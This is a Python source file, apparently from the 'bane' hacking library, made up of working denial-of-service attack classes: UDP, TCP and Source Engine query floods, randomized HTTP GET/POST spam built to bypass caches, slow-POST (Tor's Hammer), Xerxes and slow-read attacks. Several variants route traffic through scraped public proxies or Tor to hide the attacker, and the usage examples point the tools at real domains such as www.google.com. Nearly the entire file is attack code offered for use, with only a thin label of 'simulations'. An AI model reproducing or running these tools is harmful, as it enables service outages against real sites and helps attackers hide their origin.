import requests,cfscrape,socks,os,sys,urllib,socket,random,time,threading,ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#import the dependencies for each python version
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    import urllib2
    from scapy.config import conf
    conf.ipv6_enabled = False
    from scapy.all import *
else:
    # Python 3.x
    import http.client
    httplib = http.client
    import urllib.request
    urllib2=urllib.request
    from kamene.config import conf
    conf.ipv6_enabled = False
    from kamene.all import *
from struct import *
from bane.iot import getip
from bane.payloads import *
from bane.proxer import *
if os.path.isdir('/data/data')==True:
    adr=True#the device is an android
if os.path.isdir('/data/data/com.termux/')==True:
    termux=True#the application which runs the module is Termux
if ((termux==False) or (adr==False)):
 from bane.swtch import *



def reorder_headers_randomly(s):
 b=s.split('\r\n\r\n')[1]
 a=s.split('\r\n\r\n')[0]
 m=a.split('\r\n')[0]
 c=a.split('\r\n')[1:]
 random.shuffle(c)
 return m+"\r\n"+"\r\n".join(c)+'\r\n\r\n'+b


def random_param():
 a=random.randint(1,2)
 if a==1:
  return str(random.randint(1,1000))
 else:
  return random.choice(lis)

def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,post_max,cookie,user_agents):
      pa=random.choice(paths)#bypassing cache engine
      q=''
      for i in range(random.randint(2,5)):
       q+=random_param()+random_param()
      p=''
      for i in range(random.randint(2,5)):
       p+=random_param()+random_param()
      if '?' in pa:
       jo='&'
      else:
       jo='?' 
      pa+=jo+q+"="+p
      #setting random headers
      for l in range(random.randint(1,5)):
       ed=random.choice(ec)
       oi=random.randint(1,3)
       if oi==2:
        gy=0
        while gy<1:
         df=random.choice(ec)
         if df!=ed:
          gy+=1
        ed+=', '
        ed+=df
      l=random.choice(al)
      for n in range(random.randint(0,5)):
       l+=';q={},'.format(round(random.uniform(.1,1),1))+random.choice(al)
      kl=random.randint(1,2)
      ck=""
      if cookie:
       ck="Cookie: "+cookie+"\r\n"
      if ty==1:
       m='GET {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept: {}\r\nAccept-Language: {}\r\nAccept-Encoding: {}\r\nAccept-Charset: {}\r\nKeep-Alive: {}\r\nConnection: Keep-Alive\r\nCache-Control: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n'.format(pa,ck,random.choice(user_agents),random.choice(a),l,ed,random.choice(ac),random.randint(100,1000),random.choice(cc),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target)
      else:
       k=''
       for _ in range(random.randint(post_field_min,post_field_max)):
        k+=random.choice(lis)
       j=''
       for x in range(random.randint(post_min,post_max)):
        j+=random.choice(lis)
       par =k+'='+j
       m= "POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,ck,random.choice(user_agents),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
      return reorder_headers_randomly(m)

def get_public_dns(timeout=15):
 try:
  return (requests.get('https://public-dns.info/nameservers.txt',timeout=timeout).text).split('\n')
 except:
  return []



def reset():#reset all values
 global counter
 counter=0
 global stop
 stop=False
 global coo
 coo=False
 global ual
 ual=[]
 global flag
 flag=-1
 global ier
 ier=0
 global pointer
 pointer=0
 global ue
 ue=[]
 
'''
   the following classes are for DoS attacks simulations with different tools that have been either originally written in 
   diffferent languages (Perl: slowloris and C: xerxes and slow_read attack...) and rewritten in python and other python tools that are PoC for 
   some vulnerabilities (slow post attacks, hulk) with some modifications that has improved their performance!!!
'''

class udp_flood:
 def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
  self.target=u
  self.port=p
  self.interval=interval
  self.min_size=min_size
  self.max_size=max_size
  self.connection=connection
  self.duration=duration
  self.limiting=limiting
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   tm=time.time()
   size=0
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     if self.connection==True:
      s.connect((self.target,self.port))
     msg=''
     for x in range(random.randint(self.min_size,self.max_size)):
      msg+=random.choice(lis)
     if len(msg)>1400:
       msg=msg[0:1400]#make sure all payloads' sizes are on the right range
     s.sendto((msg.encode('utf-8')),(self.target,self.port))
     size+=len(msg)
     self.counter+=1
     if((self.logs==True) and (int(time.time()-tm)==1)):
      sys.stdout.write("\rPackets: {} | Bytes/s: {}   ".format(self.counter,size))
      sys.stdout.flush()
      tm=time.time()
      size=0
     if self.limiting==True:
      time.sleep(self.interval)
    except:
     try:
      time.sleep(self.interval)
     except:
      pass
   self.kill() 
  except:
    pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  self.stop=True
  a=self.__dict__["counter"]
  self.reset()#this will kill any running threads instantly by setting all the attacking information to "None" and cause error which is handled with the "try...except..." around the main while loop
  return a
  
class vse_flood:
 def __init__(self,u,p=80,threads_daemon=True,interval=0.001,connection=True,duration=60,threads=1,limiting=True,logs=False):
  self.target=u
  self.port=p
  self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
  self.interval=interval
  self.connection=connection
  self.duration=duration
  self.limiting=limiting
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   tm=time.time()
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     if self.connection==True:
      s.connect((self.target,self.port))
     s.sendto(self.payload,(self.target,self.port))
     self.counter+=1
     if((self.logs==True) and (int(time.time()-tm)==1)):
      sys.stdout.write("\rPackets: {}   ".format(self.counter))
      sys.stdout.flush()
      tm=time.time()
     if self.limiting==True:
      time.sleep(self.interval)
    except:
     pass
     try:
      time.sleep(self.interval)
     except:
      pass
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a



class tcp_flood:
 def __init__(self,u,p=80,threads_daemon=True,min_size=10,max_size=50,threads=256,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.min_size=min_size
  self.max_size=max_size
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)#give time for all threads to be created
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout=(self.timeout)#we can't set timeout with socks module if we are going to use a socks proxy
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)#let the traffic go through tor
     s.connect((self.target,self.port))#connect to target 
     if (self.port==443) or (self.port==8443):
       s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)#use ssl if needed on specific ports
     for l in range(random.randint(self.round_min,self.round_max)):#send packets with random number of times for each connection (number between "round_min" and "round_max")
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if stop==True:
       break
      m=''
      for li in range(random.randint(self.min_size,self.max_size)): #each payload' size is chosen randomly between maximum and minimum values
       m+=random.choice(lis)
      try:
       if stop==True:
        break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rPackets: {} | Bytes: {}   ".format(self.counter,len(m)))
        sys.stdout.flush()
        #print("Packets: {} | Bytes: {}".format(tcp_counter,len(m)))
      except:
       break
      time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a
 
'''
  usage:

  >>>bane.tcp_flood('www.google.com')

  >>>bane.tcp_flood('www.google.com',p=80, threads=150, timeout=5)

  p: (set by default to: 80) targeted port
  threads: (set by default to: 256) threads to use
  timeout: (set by default to: 5) timeout flag
'''



class http_spam:
 def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.cookie=cookie
  self.user_agents=user_agents
  if not self.user_agents or len(self.user_agents)==0:
   self.user_agents=ua
  self.method=method
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  self.paths=paths
  self.post_min=post_min
  self.post_max=post_max
  self.post_field_max=post_field_max
  self.post_field_min=post_field_min
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
      break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout=(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     if self.method==3:
      ty=random.randint(1,2)
     else:
      ty=self.method
     if ty==1:
      req="GET"
     else:
      req="POST"
     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
     try:
       if self.stop==True:
         break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rRequest: {} | Type: {} | Bytes: {}   ".format(self.counter,req,len(m)))
        sys.stdout.flush()
        #print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
     except:
       break
     time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a


class prox_http_spam(threading.Thread):
 def __init__(self,u,p=80,cookie=None,user_agents=None,method=3,threads_daemon=True,scraping_timeout=15,http_list=None,socks4_list=None,socks5_list=None,paths=["/"],threads=256,post_min=5,post_max=10,post_field_max=100,post_field_min=50,timeout=5,round_min=5,round_max=15,interval=0.001,duration=60,logs=False,tor=False):
  self.logs=logs
  self.cookie=cookie
  self.user_agents=user_agents
  if not self.user_agents or len(self.user_agents)==0:
   self.user_agents=ua
  self.method=method
  self.stop=False
  self.counter=0
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.interval=interval
  self.round_min=round_min
  self.round_max=round_max
  self.paths=paths
  self.post_min=post_min
  self.post_max=post_max
  self.post_field_max=post_field_max
  self.post_field_min=post_field_min
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     bot_type=[]
     if len(self.httplist)>0:
      bot_type.append("h")
     if len(self.socks4list)>0:
      bot_type.append("s4")
     if len(self.socks5list)>0:
      bot_type.append("s5")
     z=random.choice(bot_type)
     if z=="h":
      line=random.choice(self.httplist)
     elif z=="s4":
      line=random.choice(self.socks4list)
     elif z=="s5":
      line=random.choice(self.socks5list)
     ipp=line.split(":")[0].split("=")[0]
     pp=line.split(":")[1].split("=")[0]
     s =socks.socksocket()
     if z=="h":
      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
     elif z=="s4":
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
     elif z=="s5":
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     if z=="h":
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     if self.method==3:
      ty=random.randint(1,2)
     else:
      ty=self.method
     if ty==1:
      req="GET"
     else:
      req="POST"
     m=setup_http_packet(self.target,ty,self.paths,self.post_field_min,self.post_field_max,self.post_min,self.post_max,self.cookie,self.user_agents)
     try:
       if stop==True:
         break
       s.send(m.encode('utf-8'))
       self.counter+=1
       if self.logs==True:
        sys.stdout.write("\rBot: {} | Request: {} | Type: {} | Bytes: {}   ".format(ipp,self.counter,req,len(m)))
        sys.stdout.flush()
        #print("Bot: {} | Request: {} | Type: {} | Bytes: {}".format(ipp,lulzer_counter,req,len(m)))
     except:
       break
     time.sleep(self.interval)
     s.close()
    except:
     pass
    time.sleep(.1)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a


class torshammer:
 def __init__(self,u,p=80,cookie=None,user_agents=None,threads_daemon=True,threads=500,timeout=5,tor=False,duration=60,logs=False,max_content=15000,min_content=10000):
  self.counter=0
  self.cookie=cookie
  self.user_agents=user_agents
  if not self.user_agents or len(self.user_agents)==0:
   self.user_agents=ua
  self.max_content=max_content
  self.min_content=min_content
  self.stop=False
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.tor=tor
  self.logs=logs
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if ((self.port==443) or (self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     self.counter+=1
     if self.logs==True:
        sys.stdout.write("\rConnected to {}:{}...".format(self.target,self.port))
        sys.stdout.flush()
        #print("Connected to {}:{}...".format(self.target,self.port))
     q=random.randint(self.min_content,self.max_content)
     ck=""
     if self.cookie:
      ck="Cookie: "+self.cookie+"\r\n"
     s.send(reorder_headers_randomly("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)).encode('utf-8'))
     for i in range(q):
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if self.stop==True:
       break
      h=random.choice(lis)
      try:
       s.send(h.encode('utf-8'))
       if self.logs==True:
        sys.stdout.write("\rPosted: {}".format(h))
        sys.stdout.flush()
        #print("Posted: {}".format(h))
       time.sleep(random.uniform(.1,3))
      except:
       break
     s.close()
    except:
     pass
    self.counter-=1
    time.sleep(.1)
    if self.stop==True:
     break
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a



class prox_hammer:
 def __init__(self,u,p=80,cookie=None,user_agents=None,threads_daemon=True,scraping_timeout=15,max_content=15000,min_content=10000,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=True):
  self.cookie=cookie
  self.user_agents=user_agents
  if not self.user_agents or len(self.user_agents)==0:
   self.user_agents=ua
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.stop=False
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.max_content=max_content
  self.min_content=min_content
  self.logs=logs
  self.counter=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     bot_type=[]
     if len(self.httplist)>0:
      bot_type.append("h")
     if len(self.socks4list)>0:
      bot_type.append("s4")
     if len(self.socks5list)>0:
      bot_type.append("s5")
     z=random.choice(bot_type)
     if z=="h":
      line=random.choice(self.httplist)
     elif z=="s4":
      line=random.choice(self.socks4list)
     elif z=="s5":
      line=random.choice(self.socks5list)
     ipp=line.split(":")[0].split("=")[0]
     pp=line.split(":")[1].split("=")[0]
     s =socks.socksocket()
     if z=="h":
      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
     elif z=="s4":
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
     elif z=="s5":
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     if z=="h":
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
     self.counter+=1
     if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     q=random.randint(self.min_content,self.max_content)
     ck=""
     if self.cookie:
      ck="Cookie: "+cookie+"\r\n"
     s.send(reorder_headers_randomly("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)).encode('utf-8'))
     for i in range(q):
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if self.stop==True:
       break
      h=random.choice(lis)
      try:
       s.send(h.encode('utf-8'))
       if self.logs==True:
        sys.stdout.write("\rPosted: {} --> {}".format(h,ipp))
        sys.stdout.flush()
        #print("Posted: {} --> {}".format(h,ipp))
       time.sleep(random.uniform(.1,3))
      except:
       break
     s.close()
    except:
     pass
    self.counter-=1
    time.sleep(.1)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a


class xerxes:
 def __init__(self,u,p=80,threads_daemon=True,threads=500,timeout=5,duration=60,logs=False,tor=False):
  self.counter=0
  self.target=u
  self.port=p
  self.stop=False
  self.duration=duration
  self.timeout=timeout
  self.tor=tor
  self.start=time.time()
  self.logs=logs
  self.id_key=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
   self.id_key+=1
 def attack(self):
  try:
   x=self.id_key
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     self.counter+=1
     """if self.logs==True:
     #print("[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.write("\r[Connected to {}:{}]".format(self.target,self.port))
     sys.stdout.flush()"""
     while True:
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if self.stop==True:
       break
      try:
       s.send("\x00".encode('utf-8'))#send NULL character
       if self.logs==True:
        sys.stdout.write("\r[{}: Voly sent]    ".format(x))
        sys.stdout.flush()
      except:
       break
      time.sleep(.2)
    except:
      pass
    self.counter-=1
    time.sleep(.3)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a


class prox_xerxes:
 def __init__(self,u,scraping_timeout=15,p=80,threads_daemon=True,threads=700,timeout=5,http_list=None,socks4_list=None,socks5_list=None,duration=60,logs=False):
  self.httplist=http_list
  if not self.httplist and self.httplist!=[]:
   self.httplist=masshttp(timeout=scraping_timeout)
  self.socks4list=socks4_list
  if not self.socks4list and self.socks4list!=[] :
   self.socks4list=massocks4(timeout=scraping_timeout)
  self.socks5list=socks5_list
  if not self.socks5list and self.socks5list!=[]:
   self.socks5list=massocks5(timeout=scraping_timeout)
  self.stop=False
  self.counter=0
  self.start=time.time()
  self.target=u
  self.duration=duration
  self.port=p
  self.timeout=timeout
  self.logs=logs
  self.id_key=0
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
   self.id_key+=1
 def attack(self):
  try:
   x=self.id_key
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try:
     bot_type=[]
     if len(self.httplist)>0:
      bot_type.append("h")
     if len(self.socks4list)>0:
      bot_type.append("s4")
     if len(self.socks5list)>0:
      bot_type.append("s5")
     z=random.choice(bot_type)
     if z=="h":
      line=random.choice(self.httplist)
     elif z=="s4":
      line=random.choice(self.socks4list)
     elif z=="s5":
      line=random.choice(self.socks5list)
     ipp=line.split(":")[0].split("=")[0]
     pp=line.split(":")[1].split("=")[0]
     s =socks.socksocket()
     if z=="h":
      s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
     elif z=="s4":
      s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
     elif z=="s5":
      s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
     if z=="h":
      s.settimeout(self.timeout)
     s.connect((self.target,self.port))
     self.counter+=1
     while True:
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if self.stop==True:
       break
      try:
       s.send("\x00".encode('utf-8'))#send NULL character
       if self.logs==True:
        sys.stdout.write("\r[{}: Voly sent-->{}]     ".format(x,ipp))
        sys.stdout.flush()
      except:
       break
      time.sleep(.2)
    except:
     pass
    self.counter-=1
    time.sleep(.3)
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a
  
'''
   this tool is to perform slow reading attack. i read about this type of attacks on: https://blog.qualys.com/tag/slow-http-attack and tried to do the same thing in python (but in a better way though :p ). on this attack, the attacker is sending a full legitimate HTTP request but reading it slowly to keep the connection open as long as possible. here im doing it a bit different of the original attack with slowhttptest, im sending a normal HTTP request on each thread then read a small part of it (between 1 to 3 bytes randomly sized) then it sleeps for few seconds (3 to 5 seconds randomly sized too), then it sends another request and keep doing the same and keeping the connection open forever.

   it takes the following parameters:

   u: target ip or domain
   p: (set by default to: 80)
   threads: (set by default to: 500) number of connections
   timeout: (set by default to: 5) connection timeout flag 

   example:

   >>>import bane
   >>>bane.slow_read_attack('www.google.com',p=443,threads=300,timeout=7)

'''

class slow_read:
 def __init__(self,u,p=80,cookie=None,user_agents=None,paths=["/"],threads_daemon=True,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
  self.counter=0
  self.cookie=cookie
  self.user_agents=user_agents
  if not self.user_agents or len(self.user_agents)==0:
   self.user_agents=ua
  self.stop=False
  self.target=u
  self.port=p
  self.paths=paths
  self.timeout=timeout
  self.tor=tor
  self.read_max=max_read
  self.read_min=min_read
  self.min_speed=min_speed
  self.max_speed=max_speed
  self.logs=logs
  self.duration=duration
  self.start=time.time()
  for x in range(threads):
   t=threading.Thread(target=self.attack)
   t.daemon=threads_daemon
   t.start()
 def attack(self):
  try:
   time.sleep(1)
   while True:
    if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
     break
    if self.stop==True:
     break
    try: 
     s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
     if self.tor==False:
      s.settimeout(self.timeout)
     if self.tor==True:
      s.setproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1' , 9050, True)
     s.connect((self.target,self.port))
     if ((self.port==443)or(self.port==8443)):
      s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
     while True:
      if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
       break
      if self.stop==True:
       break
      try:
       s.send(setup_http_packet(self.target,3,self.paths,2,8,10,50,self.cookie,self.user_agents).encode('utf-8'))
       self.counter+=1
       while True:    
        d=s.recv(random.randint(self.read_min,self.read_max))
        if self.logs==True:
         sys.stdout.write("\rReceived: {}   ".format(str(d.decode('utf-8').strip())))
         sys.stdout.flush()
         #print("Received: {}".format(str(d.decode('utf-8'))))
        time.sleep(random.randint(self.min_speed,self.max_speed))
      except:
       break
     s.close()
    except:
     pass
   self.kill()
  except:
   pass
 def done(self):
  if 'stop' in dir(self):
   return False
  return True
 def reset(self):
   l=[]
   for x in self.__dict__:
    self.__dict__[x]=None
    l.append(x)
   for x in l:
    delattr(self,x)
 def kill(self):
  if 'stop' in dir(self):
   self.stop=True
   a=self.__dict__["counter"]
   self.reset()
   return a















"""


The rest of the DDoS tools have been removed and will be added slowly in the coming versions :) Be patient !!


"""
